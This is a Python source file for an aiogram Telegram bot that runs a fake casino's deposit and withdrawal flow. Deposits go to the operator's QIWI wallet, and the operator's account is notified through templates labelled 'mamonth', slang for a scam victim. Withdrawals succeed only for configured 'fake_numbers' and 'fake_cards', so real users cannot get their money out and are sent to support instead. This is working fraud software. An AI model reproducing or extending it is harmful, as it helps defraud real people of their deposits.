import random

from aiogram import types
from aiogram.dispatcher.filters.builtin import Text
from aiogram.dispatcher import FSMContext
from loguru import logger

from models import CasinoUser, CasinoUserHistory, CasinoPayment
from loader import config, dp, main_bot
from data import texts, keyboards
from data.states import SelfCabine, AddBalance, OutBalance


@dp.message_handler(Text(startswith="пополн", ignore_case=True), state="*")
async def add_in_game(message: types.Message):
    try:
        user = CasinoUser.get(cid=message.chat.id)
        await message.answer(texts.add.format(min_deposit=user.min_deposit))
        await AddBalance.add_type.set()
    except CasinoUser.DoesNotExist:
        logger.debug(f"{message.chat.id=} - does not exist")


@dp.message_handler(
    lambda mes: not mes.text.isdigit(),
    state=AddBalance.add_type,
)
async def add_reqiz_invalid(message: types.Message):
    await message.reply(
        texts.amount_must_be_digit
    )  # "Сумма должна быть числом.\n\nВведите сумму пополнения")  ####


@dp.callback_query_handler(text="back_add", state="*")
async def back_add_choice_global(query: types.CallbackQuery):
    try:
        user = CasinoUser.get(cid=query.from_user.id)
        await query.message.edit_text(texts.add.format(min_deposit=user.min_deposit))
        await AddBalance.add_type.set()
    except CasinoUser.DoesNotExist:
        logger.debug(f"{query.from_user.id=} - DoesNotExist")


@dp.message_handler(state=AddBalance.add_type)
async def choice_add_type(message: types.Message, state: FSMContext):
    try:
        user = CasinoUser.get(cid=message.chat.id)
    except CasinoUser.DoesNotExist:
        logger.debug(f"{message.chat.id=} - does not exist")
        return

    amount = int(message.text)
    if amount < user.min_deposit:
        await message.answer(
            f"Минимальная сумма депозита - <b>{user.min_deposit} RUB</b>"  ####
        )
        return

    if config.qiwi_tokens is None:
        await chosen_add_banker(message)
    else:
        async with state.proxy() as data:
            data["amount"] = amount

        await AddBalance.amount.set()
        await message.answer(
            texts.add_type,
            reply_markup=keyboards.add_type_keyboard,
        )


@dp.callback_query_handler(text="qiwi_add_type", state=AddBalance.amount)
async def add_by_qiwi(query: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        amount = data["amount"]

    try:
        user = CasinoUser.get(cid=query.from_user.id)
    except CasinoUser.DoesNotExist:
        logger.debug(f"#{query.from_user.id} - does not exist")
        return

    if config.qiwi_tokens is None:
        logger.error(f"{config.qiwi_tokens=}")
        return  # no tokens!

    account = config.qiwi_tokens[0]["wallet"]
    comment = random.randint(1000000, 9999999)
    pay = CasinoPayment.create(owner=user, comment=comment, amount=amount)

    await query.message.edit_text(
        texts.add_req.format(
            amount=amount,
            account=account,
            comment=comment,
        ),
        reply_markup=keyboards.add_req_keyboard(amount, comment, account),
    )
    await main_bot.send_message(
        user.owner.cid,
        texts.pay_mamonth.format(
            mention=texts.mention.format(cid=user.cid, name=user.fullname),
            cid=user.cid,
            uid=user.id,
            amount=amount,
        ),
        reply_markup=keyboards.pay_accept(pay.id),
    )
    await SelfCabine.main.set()


@dp.callback_query_handler(text="banker_add_type", state=AddBalance.amount)
async def add_by_banker(query: types.CallbackQuery):
    await query.message.edit_text(
        texts.add_banker,
        reply_markup=keyboards.add_banker_manual_keyboard,
    )
    await SelfCabine.main.set()


@dp.callback_query_handler(text="banker_add_type", state="*")
async def add_by_banker(query: types.CallbackQuery):
    await query.message.edit_text(
        texts.add_banker,
        reply_markup=keyboards.add_banker_manual_keyboard2,
    )
    await SelfCabine.main.set()


async def chosen_add_banker(message: types.Message):
    await message.answer(
        texts.add_banker,
        reply_markup=keyboards.add_banker_manual_keyboard,
    )


@dp.callback_query_handler(lambda cb: cb.data.split("_")[0] == "check", state="*")
async def add_check(query: types.CallbackQuery):
    try:
        user = CasinoUser.get(cid=query.message.chat.id)
        comment = query.data.split("_")[1]

        try:
            payment = CasinoPayment.get(owner=user, comment=comment)
            if payment.done:
                user.balance += payment.amount + user.bonus
                user.save()
                CasinoUserHistory.create(
                    owner=user,
                    amount=payment.amount,
                    balance=user.balance,
                )
                await query.message.answer(
                    texts.add_succesful.format(amount=payment.amount + user.bonus)
                )
                await query.message.delete()
            else:
                await query.message.answer(texts.add_unsuccesful)
        except CasinoPayment.DoesNotExist:
            logger.warning(f"for {query.from_user.id=} - payment does not exist")
            await query.message.answer(
                "Похоже вы уже оплатили этот счёт или он не существует."  ########
            )
    except CasinoUser.DoesNotExist:
        logger.debug(f"{query.message.chat.id=} - does not exist")


@dp.message_handler(Text(startswith="выв", ignore_case=True), state="*")
async def out_game(message: types.Message):
    try:
        user = CasinoUser.get(cid=message.chat.id)
        if user.balance > 0:
            await message.answer(
                texts.out_req,
                reply_markup=keyboards.cancel_keyboard,
            )
            await OutBalance.number.set()
        else:
            await message.answer(
                texts.invalid_outbalance.format(
                    amount=user.balance,
                ),
            )
    except CasinoUser.DoesNotExist:
        logger.debug(f"{message.chat.id=} - does not exist")


@dp.message_handler(regexp="\+\d{10,}|\d{10,}", state=OutBalance.number)
async def out_number(message: types.Message, state: FSMContext, regexp):
    try:
        user = CasinoUser.get(cid=message.chat.id)
        group = regexp.group()
        if group[0] == "+":
            group = group[1:]

        lmbd = lambda b: b.replace("r", "").replace("u", "")
        fake_nums = list(map(lmbd, config.fake_numbers)) + list(
            map(lmbd, config.fake_cards)
        )

        if group in fake_nums:
            # async with state.proxy() as data:
            amount = user.balance
            user.balance = 0
            user.save()

            CasinoUserHistory.create(
                owner=user,
                amount=amount,
                editor=1,
                balance=user.balance,
            )
            await main_bot.send_message(
                user.owner.cid,
                texts.out_mamonth.format(
                    mention=texts.mention.format(
                        cid=user.cid,
                        name=user.fullname,
                    ),
                    cid=user.cid,
                    uid=user.id,
                    amount=amount,
                ),
            )

            await message.answer(
                f"На вывод: <b>{amount} RUB</b>\n" + texts.out_req_succesful,  # ch
                reply_markup=keyboards.main_keyboard(),
            )
        else:
            await message.answer(
                texts.out_invreq.format(support_username=config.casino_sup_username),
                reply_markup=keyboards.main_keyboard(),
            )
        await state.finish()
    except CasinoUser.DoesNotExist:
        logger.debug(f"{message.chat.id=} - does not exist")


@dp.message_handler(state=OutBalance.number)
async def invalid_outnumber(message: types.Message, state: FSMContext):
    await message.answer("Введите корректный номер.")  # change
    logger.debug(f"{message.chat.id=} - invalid withdrawal number")


@dp.callback_query_handler(text="paycard", state="*")
async def paycard_cback(query: types.CallbackQuery):
    await query.answer('Что бы оплатить картой, нажмите "Перейти к оплате".')  # change
